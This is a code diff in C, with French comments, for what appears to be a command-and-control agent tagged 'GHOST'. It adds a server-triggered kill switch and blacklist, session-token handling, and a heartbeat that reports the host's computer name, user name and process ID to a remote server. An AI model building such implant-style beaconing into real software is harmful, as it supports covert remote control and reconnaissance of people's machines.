@@ -26,7 +26,10 @@ static BYTE g_buildKey[32] = {
 };
 
 static BOOL g_isAuthenticated = FALSE;
-static char g_authToken[65] = {0}; // Token de session après auth
+static BOOL g_isKilled = FALSE;           // Kill switch activé
+static char g_authToken[65] = {0};        // Token de session après auth
+static char g_agentID[32] = {0};          // ID unique de l'agent
+static DWORD g_lastHeartbeat = 0;         // Dernier heartbeat
 
 /* Crypto helpers */
 
@@ -212,5 +215,156 @@ BOOL Auth_GenerateAgentID(char* agentID, DWORD agentIDSize) {
     // Formate l'ID
     snprintf(agentID, agentIDSize, "GHOST-%08X", combinedID);
 
+    // Stocke l'ID localement
+    strncpy(g_agentID, agentID, sizeof(g_agentID) - 1);
+
+    return TRUE;
+}
+
+/*
+ * Retourne l'ID de l'agent
+ */
+const char* Auth_GetAgentID(void) {
+    if (g_agentID[0] == '\0') {
+        Auth_GenerateAgentID(g_agentID, sizeof(g_agentID));
+    }
+    return g_agentID;
+}
+
+/* Kill Switch */
+
+/*
+ * Active le kill switch - l'agent s'arrêtera proprement
+ */
+void Auth_ActivateKillSwitch(void) {
+    g_isKilled = TRUE;
+    g_isAuthenticated = FALSE;
+    memset(g_authToken, 0, sizeof(g_authToken));
+}
+
+/*
+ * Vérifie si le kill switch est activé
+ */
+BOOL Auth_IsKilled(void) {
+    return g_isKilled;
+}
+
+/*
+ * Vérifie le kill switch auprès du serveur
+ * Retourne TRUE si l'agent doit continuer, FALSE s'il doit s'arrêter
+ */
+BOOL Auth_CheckKillSwitch(const char* serverResponse) {
+    if (!serverResponse) return TRUE;
+    
+    // Cherche "kill":true dans la réponse JSON
+    if (strstr(serverResponse, "\"kill\":true") != NULL ||
+        strstr(serverResponse, "\"kill\": true") != NULL) {
+        Auth_ActivateKillSwitch();
+        return FALSE;
+    }
+    
+    // Cherche si notre ID est dans une blacklist
+    const char* agentID = Auth_GetAgentID();
+    if (strstr(serverResponse, agentID) != NULL &&
+        strstr(serverResponse, "\"blacklist\"") != NULL) {
+        Auth_ActivateKillSwitch();
+        return FALSE;
+    }
+    
+    return TRUE;
+}
+
+/* Heartbeat */
+
+/*
+ * Met à jour le timestamp du dernier heartbeat
+ */
+void Auth_UpdateHeartbeat(void) {
+    g_lastHeartbeat = GetTickCount();
+}
+
+/*
+ * Retourne le temps écoulé depuis le dernier heartbeat (en ms)
+ */
+DWORD Auth_GetTimeSinceHeartbeat(void) {
+    if (g_lastHeartbeat == 0) return 0;
+    return GetTickCount() - g_lastHeartbeat;
+}
+
+/*
+ * Vérifie si le heartbeat est en timeout
+ * timeout: temps max en ms avant de considérer le serveur down
+ */
+BOOL Auth_IsHeartbeatTimeout(DWORD timeoutMs) {
+    if (g_lastHeartbeat == 0) return FALSE;
+    return (GetTickCount() - g_lastHeartbeat) > timeoutMs;
+}
+
+/*
+ * Génère les données de heartbeat en JSON
+ */
+BOOL Auth_GenerateHeartbeat(char* outJson, DWORD outJsonSize) {
+    if (!outJson || outJsonSize < 256) return FALSE;
+    
+    const char* agentID = Auth_GetAgentID();
+    
+    // Récupère quelques infos système
+    DWORD pid = GetCurrentProcessId();
+    
+    char computerName[256] = {0};
+    DWORD compNameSize = sizeof(computerName);
+    GetComputerNameA(computerName, &compNameSize);
+    
+    char userName[256] = {0};
+    DWORD userNameSize = sizeof(userName);
+    GetUserNameA(userName, &userNameSize);
+    
+    snprintf(outJson, outJsonSize,
+        "{\n"
+        "  \"type\": \"heartbeat\",\n"
+        "  \"agent_id\": \"%s\",\n"
+        "  \"pid\": %lu,\n"
+        "  \"computer\": \"%s\",\n"
+        "  \"user\": \"%s\",\n"
+        "  \"authenticated\": %s,\n"
+        "  \"uptime_ms\": %lu\n"
+        "}",
+        agentID,
+        pid,
+        computerName,
+        userName,
+        g_isAuthenticated ? "true" : "false",
+        GetTickCount());
+    
+    return TRUE;
+}
+
+/*
+ * Valide une réponse du serveur et met à jour l'état
+ */
+BOOL Auth_ValidateServerResponse(const char* response) {
+    if (!response) return FALSE;
+    
+    // Vérifie le kill switch d'abord
+    if (!Auth_CheckKillSwitch(response)) {
+        return FALSE;
+    }
+    
+    // Met à jour le heartbeat
+    Auth_UpdateHeartbeat();
+    
+    // Cherche un nouveau token si présent
+    const char* tokenStart = strstr(response, "\"token\":\"");
+    if (tokenStart) {
+        tokenStart += 9; // Skip "token":"
+        const char* tokenEnd = strchr(tokenStart, '"');
+        if (tokenEnd && (tokenEnd - tokenStart) < 64) {
+            size_t tokenLen = tokenEnd - tokenStart;
+            memset(g_authToken, 0, sizeof(g_authToken));
+            memcpy(g_authToken, tokenStart, tokenLen);
+            g_isAuthenticated = TRUE;
+        }
+    }
+    
     return TRUE;
 }
